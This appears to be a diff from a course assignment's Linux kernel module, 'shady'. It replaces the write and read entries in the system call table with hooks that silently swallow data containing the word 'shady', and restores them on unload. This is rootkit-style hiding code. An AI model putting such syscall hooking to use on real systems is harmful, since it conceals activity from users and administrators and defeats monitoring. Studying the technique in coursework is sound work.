@@ -58,8 +58,33 @@ static struct class *shady_class = NULL;
 //more stuff rom assignment description
 asmlinkage int (*old_open) (const char*, int, int);
 asmlinkage ssize_t (*old_write) (int fd, const void *buf, size_t count);
+asmlinkage ssize_t (*old_read) (int fd, const void *buf, size_t count);
 
 asmlinkage ssize_t my_write(int fd, const void *buf, size_t count)
+{
+     int i;
+     int searchIndex = 0;
+     int searchLength = 5;
+     char searchText[] = "shady";
+     for(i=0; i<count; i++)
+     {
+          if(((char*)buf)[i]==searchText[searchIndex])
+          {
+               searchIndex++;
+               if(searchIndex==searchLength)
+               {
+                    return count;
+               }
+          }
+          else
+          {
+               searchIndex=0;
+          }
+     }
+     return old_write(fd, buf, count);
+}
+
+asmlinkage ssize_t my_read(int fd, const void *buf, size_t count)
 {
      int i;
      int searchIndex = 0;
@@ -242,6 +267,7 @@ shady_cleanup_module(int devices_to_destroy)
      //my code
      ((unsigned long **)system_call_table_address)[__NR_open] = old_open;
      ((unsigned long **)system_call_table_address)[__NR_write] = old_write;
+     ((unsigned long **)system_call_table_address)[__NR_read] = old_read;
      //end
 	
   /* Get rid of character devices (if any exist) */
@@ -284,6 +310,8 @@ shady_init_module(void)
      //hiding code
      old_write = ((unsigned long **)system_call_table_address)[__NR_write];
      ((unsigned long **)system_call_table_address)[__NR_write] = my_write;
+     old_read = ((unsigned long **)system_call_table_address)[__NR_read];
+     ((unsigned long **)system_call_table_address)[__NR_read] = my_read;
      //end
 	
   if (shady_ndevices <= 0)
